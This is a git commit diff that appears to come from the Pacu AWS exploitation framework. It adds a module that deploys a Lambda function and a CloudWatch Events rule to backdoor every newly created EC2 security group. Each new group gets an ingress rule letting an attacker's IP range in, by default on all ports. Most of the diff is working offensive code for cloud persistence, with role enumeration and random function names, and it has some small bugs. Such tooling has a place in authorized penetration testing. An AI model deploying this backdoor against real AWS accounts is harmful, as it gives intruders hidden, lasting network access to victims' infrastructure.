8c381b2d81283cdab1a6318646a8c4785f3fe970
Spencer Gietzen <spencer@spengietz.com>
2018-09-27 15:33:23 -0700

    mostly completed lambda__backdoor_new_sec_groups

---
+++ modules/lambda__backdoor_new_sec_groups/lambda_function.py
@@ -0,0 +1,8 @@
+import boto3
+def a(event, context):
+    if event['detail']['eventName'] == 'CreateSecurityGroup':
+        rule=[{'FromPort':FROM_PORT,'ToPort':TO_PORT,'CidrIp':'IP_RANGE','IpProtocol':'IP_PROTOCOL'}]
+        name=event['detail']['requestParameters']['groupName']
+        c=boto3.client('ec2')
+        response=c.authorize_security_group_ingress(GroupName=name,CidrIp=rule['CidrIp'],FromPort=rule['FromPort'],ToPort=rule['ToPort'],IpProtocol=rule['IpProtocol'])
+    return
--- modules/lambda__backdoor_new_sec_groups/main.py
+++ modules/lambda__backdoor_new_sec_groups/main.py
@@ -20,7 +20,7 @@ module_info = {
 
     'external_dependencies': [],
 
-    'arguments_to_autocomplete': ['--regions', '--ip-range', '==port-range'],
+    'arguments_to_autocomplete': ['--regions', '--ip-range', '--port-range', '--protocol'],
 }
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
@@ -28,6 +28,7 @@ parser = argparse.ArgumentParser(add_help=False, description=module_info['descri
 parser.add_argument('--regions', required=False, default=None, help='One or more (comma separated) AWS regions to create the backdoor Lambda function in, in the format "us-east-1". Defaults to all session regions.')
 parser.add_argument('--ip-range', required=True, help='The IP range to allow backdoor access to. This would most likely be your own IP address in the format: 127.0.0.1/32')
 parser.add_argument('--port-range', required=False, default='1-65535', help='The port range to give yourself access to in the format: starting-ending (ex: 200-800). By default, all ports are allowed (1-65535).')
+parser.add_argument('--protocol', required=False, default='tcp', help='The protocol for the IP range specified. Options are: TCP, UDP, ICMP, or ALL. The default is TCP. WARNING: When supplying ALL, AWS will automatically allow traffic on all ports, regardless of the range specified. More information is available here: https://boto3.readthedocs.io/en/latest/reference/services/ec2.html#EC2.Client.authorize_security_group_ingress')
 
 
 def main(args, pacu_main):
@@ -40,12 +41,98 @@ def main(args, pacu_main):
     get_regions = pacu_main.get_regions
     ######
 
-    regions = get_regions('Lambda')
+    data = {'functions_created': 0, 'rules_created': 0, 'successes': 0}
+
+    if not args.regions:
+        regions = get_regions('Lambda')
+    else:
+        regions = args.regions.split(',')
+
+    from_port, to_port = args.port_range.split('-')
+
+    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the EC2 AuthorizeSecurityGroupIngress permission. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
+    if not target_role_arn:
+        if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][1], '--roles') is False:
+            print('Pre-req module not run successfully. Exiting...')
+            return False
+        roles = deepcopy(session.IAM['Roles'])
+
+        print('Found {} roles. Choose one below.'.format(len(roles)))
+        for i in range(0, len(roles)):
+            print('  [{}] {}'.format(i, roles[i]['RoleName']))
+        choice = input('Choose an option: ')
+        target_role_arn = roles[int(choice)]['Arn']
+
+    # Import the Lambda function and modify the variables it needs
+    with open('./modules/{}/lambda_function.py.bak'.format(module_info['name']), 'r') as f:
+        code = f.read()
+
+    code = code.replace('FROM_PORT', from_port).replace('TO_PORT', to_port).replace('IP_RANGE', args.ip_range).replace('IP_PROTOCOL', args.protocol)
+
+    with open('./modules/{}/lambda_function.py'.format(module_info['name']), 'w+') as f:
+        f.write(code)
+
+     # Zip the Lambda function
+    try:
+        subprocess.run(['zip', './modules/{}/lambda_function.zip'.format(module_info['name']), './modules/{}/lambda_function.py'.format(module_info['name'])], shell=True)
+    except Exception as error:
+        print('Failed to zip the Lambda function locally: {}\n'.format(error))
+        return data
+
+    with open('./modules/{}/lambda_function.zip'.format(module_info['name']), 'rb') as f:
+        zip_file_bytes = f.read()
 
     for region in regions:
         print('Starting region {}...'.format(region))
         client = pacu_main.get_boto3_client('lambda', region)
-        data = client.do_something()
+
+        try:
+            function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
+            response = client.create_function(
+                FunctionName=function_name,
+                Runtime='python3.6',
+                Role=target_role_arn,
+                Handler='a',
+                Code={
+                    'ZipFile': zip_file_bytes
+                }
+            )
+            lambda_arn = response['FunctionArn']
+            print('  Created Lambda function: {}'.format(function_name))
+            data['functions_created'] += 1
+
+            client = pacu_main.get_boto3_client('events', region)
+
+            response = client.put_rule(
+                Name=function_name,
+                EventPattern='{"source":["aws.ec2"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["ec2.amazonaws.com"],"eventName":["CreateSecurityGroup"]}}',
+                State='ENABLED'
+            )
+            print('  Created CloudWatch Events rule: {}'.format(response['RuleArn']))
+            data['rules_created'] += 1
+
+            response = client.put_targets(
+                Rule=function_name,
+                Targets={
+                    'Id': 0,
+                    'Arn': lambda_arn
+                }
+            )
+            if response['FailedEntryCount'] > 0:
+                print('Failed to add the Lambda function as a target to the CloudWatch rule. Failed entries:')
+                print(response['FailedEntries'])
+            else:
+                print('  Added Lambda target to CloudWatch Events rule.')
+                data['successes'] += 1
+
+        except ClientError as error:
+            code = error.response['Error']['Code']
+            if code == 'AccessDeniedException':
+                print('  FAILURE: MISSING NEEDED PERMISSIONS')
+            else:
+                print(code)
+
+
 
     return data
 
